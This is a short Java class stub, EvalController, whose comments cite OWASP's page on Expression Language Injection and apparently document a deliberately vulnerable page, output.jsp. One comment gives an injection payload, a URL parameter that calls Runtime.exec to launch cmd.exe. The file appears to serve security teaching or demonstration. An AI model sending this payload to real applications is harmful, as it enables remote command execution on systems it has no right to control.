public class EvalController {
    // Reference:
    // OWASP Foundation. "Expression Language Injection." Vulnerabilities. https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection (retrieved Feb. 21, 2024).

    // see output.jsp:
    // A URL of the following form would provide system code access:
    // ?vulnerable=T(java.lang.Runtime).getRuntime().exec(“cmd.exe”)
}